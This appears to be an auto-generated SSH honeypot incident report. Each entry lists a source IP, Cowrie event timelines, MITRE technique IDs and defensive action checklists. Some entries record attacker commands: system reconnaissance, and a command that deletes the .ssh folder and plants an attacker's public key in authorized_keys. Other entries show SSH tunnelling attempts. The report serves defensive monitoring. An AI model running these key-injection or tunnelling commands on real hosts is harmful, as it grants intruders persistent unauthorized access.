**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:50:26` | `cowrie.session.connect` |
| `2026-08-30 11:50:27` | `cowrie.client.version` |
| `2026-08-30 11:50:27` | `cowrie.client.kex` |
| `2026-08-30 11:50:29` | `cowrie.login.success` |
| `2026-08-30 11:50:30` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:50:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.36[.]62` to AbuseIPDB if not already reported
- [ ] Block `182.76.36[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5279a4272769

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 11:50 |
| **Last Seen** | 2026-08-30 11:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:50:35` | `cowrie.session.connect` |
| `2026-08-30 11:50:35` | `cowrie.client.version` |
| `2026-08-30 11:50:35` | `cowrie.client.kex` |
| `2026-08-30 11:50:36` | `cowrie.login.success` |
| `2026-08-30 11:50:36` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:50:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 11:50:37` | `cowrie.direct-tcpip.data` |
| `2026-08-30 11:50:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b6760b37439

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 11:53 |
| **Last Seen** | 2026-08-30 11:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:53:27` | `cowrie.session.connect` |
| `2026-08-30 11:53:27` | `cowrie.client.version` |
| `2026-08-30 11:53:27` | `cowrie.client.kex` |
| `2026-08-30 11:53:28` | `cowrie.login.success` |
| `2026-08-30 11:53:28` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:53:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 11:53:28` | `cowrie.direct-tcpip.data` |
| `2026-08-30 11:53:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a164741a3b0

| Field | Detail |
|---|---|
| **Source IP** | `43.245.85[.]2` |
| **First Seen** | 2026-08-30 11:57 |
| **Last Seen** | 2026-08-30 11:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:57:03` | `cowrie.session.connect` |
| `2026-08-30 11:57:03` | `cowrie.client.version` |
| `2026-08-30 11:57:03` | `cowrie.client.kex` |
| `2026-08-30 11:57:06` | `cowrie.login.success` |
| `2026-08-30 11:57:07` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:57:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.245.85[.]2` to AbuseIPDB if not already reported
- [ ] Block `43.245.85[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ddd5ab7de72

| Field | Detail |
|---|---|
| **Source IP** | `221.182.185[.]190` |
| **First Seen** | 2026-08-30 11:57 |
| **Last Seen** | 2026-08-30 11:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:57:12` | `cowrie.session.connect` |
| `2026-08-30 11:57:13` | `cowrie.client.version` |
| `2026-08-30 11:57:13` | `cowrie.client.kex` |
| `2026-08-30 11:57:15` | `cowrie.login.success` |
| `2026-08-30 11:57:16` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.182.185[.]190` to AbuseIPDB if not already reported
- [ ] Block `221.182.185[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3c15e470e26

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]254` |
| **First Seen** | 2026-08-30 11:58 |
| **Last Seen** | 2026-08-30 11:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:58:36` | `cowrie.session.connect` |
| `2026-08-30 11:58:36` | `cowrie.client.version` |
| `2026-08-30 11:58:36` | `cowrie.client.kex` |
| `2026-08-30 11:58:37` | `cowrie.login.success` |
| `2026-08-30 11:58:38` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]254` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-519da631c8dd

| Field | Detail |
|---|---|
| **Source IP** | `171.8.42[.]112` |
| **First Seen** | 2026-08-30 11:58 |
| **Last Seen** | 2026-08-30 11:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:58:48` | `cowrie.session.connect` |
| `2026-08-30 11:58:49` | `cowrie.client.version` |
| `2026-08-30 11:58:49` | `cowrie.client.kex` |
| `2026-08-30 11:58:51` | `cowrie.login.success` |
| `2026-08-30 11:58:52` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:58:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.8.42[.]112` to AbuseIPDB if not already reported
- [ ] Block `171.8.42[.]112` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9051fac3eabb

| Field | Detail |
|---|---|
| **Source IP** | `213.149.216[.]10` |
| **First Seen** | 2026-08-30 11:58 |
| **Last Seen** | 2026-08-30 12:03 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:58:57` | `cowrie.session.connect` |
| `2026-08-30 11:58:58` | `cowrie.client.version` |
| `2026-08-30 11:58:58` | `cowrie.client.kex` |
| `2026-08-30 11:58:59` | `cowrie.login.success` |
| `2026-08-30 11:58:59` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:03:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.149.216[.]10` to AbuseIPDB if not already reported
- [ ] Block `213.149.216[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-391ccdd3886d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:00 |
| **Last Seen** | 2026-08-30 12:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:00:34` | `cowrie.session.connect` |
| `2026-08-30 12:00:34` | `cowrie.client.version` |
| `2026-08-30 12:00:34` | `cowrie.client.kex` |
| `2026-08-30 12:00:35` | `cowrie.login.success` |
| `2026-08-30 12:00:36` | `cowrie.session.params` |
| `2026-08-30 12:00:36` | `cowrie.command.input` |
| `2026-08-30 12:00:36` | `cowrie.log.closed` |
| `2026-08-30 12:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d479c6ca9a6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 12:01 |
| **Last Seen** | 2026-08-30 12:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:01:22` | `cowrie.session.connect` |
| `2026-08-30 12:01:22` | `cowrie.client.version` |
| `2026-08-30 12:01:22` | `cowrie.client.kex` |
| `2026-08-30 12:01:23` | `cowrie.login.success` |
| `2026-08-30 12:01:23` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:01:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 12:01:23` | `cowrie.direct-tcpip.data` |
| `2026-08-30 12:01:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24386ef333b1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:02 |
| **Last Seen** | 2026-08-30 12:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:02:57` | `cowrie.session.connect` |
| `2026-08-30 12:02:57` | `cowrie.client.version` |
| `2026-08-30 12:02:57` | `cowrie.client.kex` |
| `2026-08-30 12:02:58` | `cowrie.login.success` |
| `2026-08-30 12:02:59` | `cowrie.session.params` |
| `2026-08-30 12:02:59` | `cowrie.command.input` |
| `2026-08-30 12:02:59` | `cowrie.log.closed` |
| `2026-08-30 12:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78f9151ab572

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 12:03 |
| **Last Seen** | 2026-08-30 12:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:03:04` | `cowrie.session.connect` |
| `2026-08-30 12:03:04` | `cowrie.client.version` |
| `2026-08-30 12:03:04` | `cowrie.client.kex` |
| `2026-08-30 12:03:05` | `cowrie.login.success` |
| `2026-08-30 12:03:06` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:03:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 12:03:06` | `cowrie.direct-tcpip.data` |
| `2026-08-30 12:03:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1b5d102274b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:03 |
| **Last Seen** | 2026-08-30 12:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:03:41` | `cowrie.session.connect` |
| `2026-08-30 12:03:42` | `cowrie.client.version` |
| `2026-08-30 12:03:42` | `cowrie.client.kex` |
| `2026-08-30 12:03:44` | `cowrie.login.success` |
| `2026-08-30 12:03:46` | `cowrie.session.params` |
| `2026-08-30 12:03:46` | `cowrie.command.input` |
| `2026-08-30 12:03:46` | `cowrie.command.input` |
| `2026-08-30 12:03:46` | `cowrie.command.input` |
| `2026-08-30 12:03:46` | `cowrie.command.input` |
| `2026-08-30 12:03:46` | `cowrie.command.input` |
| `2026-08-30 12:03:46` | `cowrie.command.success` |
| `2026-08-30 12:03:46` | `cowrie.command.input` |
| `2026-08-30 12:03:46` | `cowrie.command.input` |
| `2026-08-30 12:03:46` | `cowrie.command.input` |
| `2026-08-30 12:03:46` | `cowrie.command.input` |
| `2026-08-30 12:03:46` | `cowrie.log.closed` |
| `2026-08-30 12:03:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8837d0baaaa1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:05 |
| **Last Seen** | 2026-08-30 12:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:05:12` | `cowrie.session.connect` |
| `2026-08-30 12:05:12` | `cowrie.client.version` |
| `2026-08-30 12:05:12` | `cowrie.client.kex` |
| `2026-08-30 12:05:12` | `cowrie.login.success` |
| `2026-08-30 12:05:13` | `cowrie.session.params` |
| `2026-08-30 12:05:13` | `cowrie.command.input` |
| `2026-08-30 12:05:13` | `cowrie.log.closed` |
| `2026-08-30 12:05:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ec8704864f3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:05 |
| **Last Seen** | 2026-08-30 12:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:05:29` | `cowrie.session.connect` |
| `2026-08-30 12:05:29` | `cowrie.client.version` |
| `2026-08-30 12:05:29` | `cowrie.client.kex` |
| `2026-08-30 12:05:31` | `cowrie.login.success` |
| `2026-08-30 12:05:33` | `cowrie.session.params` |
| `2026-08-30 12:05:33` | `cowrie.command.input` |
| `2026-08-30 12:05:33` | `cowrie.command.input` |
| `2026-08-30 12:05:33` | `cowrie.command.input` |
| `2026-08-30 12:05:33` | `cowrie.command.input` |
| `2026-08-30 12:05:33` | `cowrie.command.input` |
| `2026-08-30 12:05:33` | `cowrie.command.success` |
| `2026-08-30 12:05:33` | `cowrie.command.input` |
| `2026-08-30 12:05:33` | `cowrie.command.input` |
| `2026-08-30 12:05:33` | `cowrie.command.input` |
| `2026-08-30 12:05:33` | `cowrie.command.input` |
| `2026-08-30 12:05:34` | `cowrie.log.closed` |
| `2026-08-30 12:05:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b84335176f1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:07 |
| **Last Seen** | 2026-08-30 12:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:07:16` | `cowrie.session.connect` |
| `2026-08-30 12:07:16` | `cowrie.client.version` |
| `2026-08-30 12:07:16` | `cowrie.client.kex` |
| `2026-08-30 12:07:18` | `cowrie.login.success` |
| `2026-08-30 12:07:20` | `cowrie.session.params` |
| `2026-08-30 12:07:20` | `cowrie.command.input` |
| `2026-08-30 12:07:20` | `cowrie.command.input` |
| `2026-08-30 12:07:20` | `cowrie.command.input` |
| `2026-08-30 12:07:20` | `cowrie.command.input` |
| `2026-08-30 12:07:20` | `cowrie.command.input` |
| `2026-08-30 12:07:20` | `cowrie.command.success` |
| `2026-08-30 12:07:20` | `cowrie.command.input` |
| `2026-08-30 12:07:20` | `cowrie.command.input` |
| `2026-08-30 12:07:20` | `cowrie.command.input` |
| `2026-08-30 12:07:20` | `cowrie.command.input` |
| `2026-08-30 12:07:21` | `cowrie.log.closed` |
| `2026-08-30 12:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba8ff3bcdf8c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:07 |
| **Last Seen** | 2026-08-30 12:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:07:23` | `cowrie.session.connect` |
| `2026-08-30 12:07:23` | `cowrie.client.version` |
| `2026-08-30 12:07:23` | `cowrie.client.kex` |
| `2026-08-30 12:07:23` | `cowrie.login.success` |
| `2026-08-30 12:07:24` | `cowrie.session.params` |
| `2026-08-30 12:07:24` | `cowrie.command.input` |
| `2026-08-30 12:07:24` | `cowrie.log.closed` |
| `2026-08-30 12:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d9c8cfd5e2c

| Field | Detail |
|---|---|
| **Source IP** | `188.20.244[.]19` |
| **First Seen** | 2026-08-30 12:07 |
| **Last Seen** | 2026-08-30 12:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:07:52` | `cowrie.session.connect` |
| `2026-08-30 12:07:52` | `cowrie.client.version` |
| `2026-08-30 12:07:52` | `cowrie.client.kex` |
| `2026-08-30 12:07:53` | `cowrie.login.success` |
| `2026-08-30 12:07:54` | `cowrie.session.params` |
| `2026-08-30 12:07:54` | `cowrie.command.input` |
| `2026-08-30 12:07:54` | `cowrie.command.failed` |
| `2026-08-30 12:07:54` | `cowrie.log.closed` |
| `2026-08-30 12:07:55` | `cowrie.session.params` |
| `2026-08-30 12:07:55` | `cowrie.command.input` |
| `2026-08-30 12:07:55` | `cowrie.session.file_download` |
| `2026-08-30 12:07:55` | `cowrie.log.closed` |
| `2026-08-30 12:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.20.244[.]19` to AbuseIPDB if not already reported
- [ ] Block `188.20.244[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2257f44f2814

| Field | Detail |
|---|---|
| **Source IP** | `188.20.244[.]19` |
| **First Seen** | 2026-08-30 12:07 |
| **Last Seen** | 2026-08-30 12:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:07:55` | `cowrie.session.connect` |
| `2026-08-30 12:07:55` | `cowrie.client.version` |
| `2026-08-30 12:07:55` | `cowrie.client.kex` |
| `2026-08-30 12:07:55` | `cowrie.login.success` |
| `2026-08-30 12:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.20.244[.]19` to AbuseIPDB if not already reported
- [ ] Block `188.20.244[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-135400aa4b55

| Field | Detail |
|---|---|
| **Source IP** | `188.20.244[.]19` |
| **First Seen** | 2026-08-30 12:07 |
| **Last Seen** | 2026-08-30 12:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:07:56` | `cowrie.session.connect` |
| `2026-08-30 12:07:56` | `cowrie.client.version` |
| `2026-08-30 12:07:56` | `cowrie.client.kex` |
| `2026-08-30 12:07:56` | `cowrie.login.success` |
| `2026-08-30 12:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.20.244[.]19` to AbuseIPDB if not already reported
- [ ] Block `188.20.244[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7269826bedd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:09 |
| **Last Seen** | 2026-08-30 12:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:09:33` | `cowrie.session.connect` |
| `2026-08-30 12:09:33` | `cowrie.client.version` |
| `2026-08-30 12:09:33` | `cowrie.client.kex` |
| `2026-08-30 12:09:34` | `cowrie.login.success` |
| `2026-08-30 12:09:35` | `cowrie.session.params` |
| `2026-08-30 12:09:35` | `cowrie.command.input` |
| `2026-08-30 12:09:35` | `cowrie.log.closed` |
| `2026-08-30 12:09:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d683df468977

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-30 12:10 |
| **Last Seen** | 2026-08-30 12:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
